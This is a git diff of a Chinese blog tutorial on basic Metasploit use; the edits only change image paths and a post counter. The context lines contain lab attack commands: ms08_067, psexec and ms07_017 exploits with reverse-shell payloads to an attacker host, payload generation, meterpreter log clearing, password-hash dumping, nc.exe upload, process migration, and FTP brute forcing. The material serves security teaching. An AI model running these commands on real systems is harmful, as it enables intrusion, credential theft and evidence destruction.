@@ -478,10 +478,10 @@
 <ul>
 <li>早期版本需要先启动数据库再启动 msf</li>
 </ul>
-<p><img src="zXzemZd.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/zXzemZd.png" alt="img"></p>
 </li>
 </ul>
-<p><img src="mgJH3KP.jpg" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/mgJH3KP.jpg" alt="img"></p>
 <h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
 <li>Rex<ul>
 <li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
@@ -573,21 +573,21 @@
 <h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms08067.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 445</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="rNO4Mud.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/rNO4Mud.png" alt="img"></p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat psexec.rb </span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.148</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUSER Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPASS 123456</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="ctvHDYR.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/ctvHDYR.png" alt="img"></p>
 <h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms07017.rb </span><br><span class="line">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line"><span class="builtin-name">set</span> URIPATH /</span><br><span class="line"><span class="builtin-name">set</span> SRVHOST 0.0.0.0</span><br><span class="line"><span class="builtin-name">set</span> PAYLOAD windows/shell/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> EXITFUNC thread</span><br><span class="line"><span class="builtin-name">set</span> LHOST 10.10.10.131</span><br><span class="line"><span class="builtin-name">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="meKMAdB.png" alt="img"></p>
-<p><img src="aEu1anZ.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/meKMAdB.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/aEu1anZ.png" alt="img"></p>
 <h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
 <li>用法</li>
 </ul>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08-<span class="number">067</span></span><br><span class="line">msf &gt; use payload/windows/<span class="keyword">shell</span>/bind_tcp</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate  #获得shellcode</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate -h</span><br><span class="line">    Usage: generate [<span class="keyword">options</span>]</span><br><span class="line">    Generates <span class="keyword">a</span> payload.</span><br><span class="line">    OPTIONS:</span><br><span class="line">        -E        强制编码。</span><br><span class="line">        -<span class="keyword">b</span> <span class="symbol">&lt;opt&gt;</span>  要避免的字符列表：<span class="string">'\ x00 \ xff'</span></span><br><span class="line">        -<span class="keyword">e</span> <span class="symbol">&lt;opt&gt;</span>  要使用的编码器模块的名称。</span><br><span class="line">        -<span class="keyword">f</span> <span class="symbol">&lt;opt&gt;</span>  输出文件名（否则为stdout）</span><br><span class="line">        -h        帮助横幅。</span><br><span class="line">        -i <span class="symbol">&lt;opt&gt;</span>  编码迭代的次数。</span><br><span class="line">        -<span class="keyword">k</span>        保持模板可执行的功能</span><br><span class="line">        -<span class="keyword">o</span> <span class="symbol">&lt;opt&gt;</span>  以VAR = VAL格式逗号分隔的选项列表。</span><br><span class="line">        -<span class="keyword">p</span> <span class="symbol">&lt;opt&gt;</span>  输出平台</span><br><span class="line">        -s <span class="symbol">&lt;opt&gt;</span>  NOP sled length.</span><br><span class="line">        -t <span class="symbol">&lt;opt&gt;</span>  输出格式: bash,<span class="keyword">c</span>,csharp,dw,dword,hex,java,js_be,js_le,num,<span class="keyword">perl</span>,pl,powershell,ps1,<span class="keyword">py</span>,<span class="keyword">python</span>,raw,rb,<span class="keyword">ruby</span>,<span class="keyword">sh</span>,vbapplication,vbscript,asp,aspx,aspx-<span class="keyword">exe</span>,axis2,dll,elf,elf-<span class="keyword">so</span>,<span class="keyword">exe</span>,<span class="keyword">exe</span>-<span class="keyword">only</span>,<span class="keyword">exe</span>-service,<span class="keyword">exe</span>-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-<span class="keyword">exe</span>,vba-psh,vbs,war</span><br><span class="line">        -<span class="keyword">x</span> <span class="symbol">&lt;opt&gt;</span>  要使用的可执行模板</span><br><span class="line"></span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate</span><br></pre></td></tr></table></figure>
 
-<p><img src="wEztOAj.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/wEztOAj.png" alt="img"></p>
 <ul>
 <li>自动绕过坏字符</li>
 </ul>
@@ -598,7 +598,7 @@
 </ul>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/<span class="keyword">shell</span><span class="bash">/bind_tcp) &gt; show encoders</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="siajCwd.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/siajCwd.png" alt="img"></p>
 <ul>
 <li>注入文件</li>
 </ul>
@@ -631,7 +631,7 @@
 </ul>
 <h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# cat metepreter.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="b9G8Uq6.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/b9G8Uq6.png" alt="img"></p>
 <ul>
 <li>帮助文件</li>
 </ul>
@@ -642,7 +642,7 @@
 </ul>
 <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; execute -f cmd.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev   # 清除日志</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -l</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump  # 读取密码</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/gather/hashdump  # 读取密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="lJasRoT.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/lJasRoT.png" alt="img"></p>
 <h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
 <li>2015 年11月份，来自社区贡献</li>
 <li>无需运行环境，在客户端运行原生 python 代码</li>
@@ -859,16 +859,16 @@
 </ul>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="oXOv9u8.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/oXOv9u8.png" alt="img"></p>
 <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; backgroun</span><br><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; sessions</span><br></pre></td></tr></table></figure>
 
-<p><img src="5eADIeS.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/5eADIeS.png" alt="img"></p>
 <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; set SESSION <span class="number">4</span></span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="VEpQ5Ut.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/VEpQ5Ut.png" alt="img"></p>
 <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程错误，迁移进程</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; sessions -i 4</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 828  # spoolsv.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="DCfpDji.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/DCfpDji.png" alt="img"></p>
 <h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
 <li><p>mssql 扫描端口</p>
 <ul>
@@ -909,14 +909,14 @@
 </ul>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf (scanner/ftp/ftp_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">ftp_version) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="HZ8JVfi.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/HZ8JVfi.png" alt="img"></p>
 <ul>
 <li><p>是否允许匿名登录</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">anonymous) &gt; run</span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="A6Ms8B3.png" alt="img"></p>
+<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/A6Ms8B3.png" alt="img"></p>
 <ul>
 <li><p>暴力破解</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">ftp</span>/ftp_login</span><br></pre></td></tr></table></figure>
@@ -1058,7 +1058,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
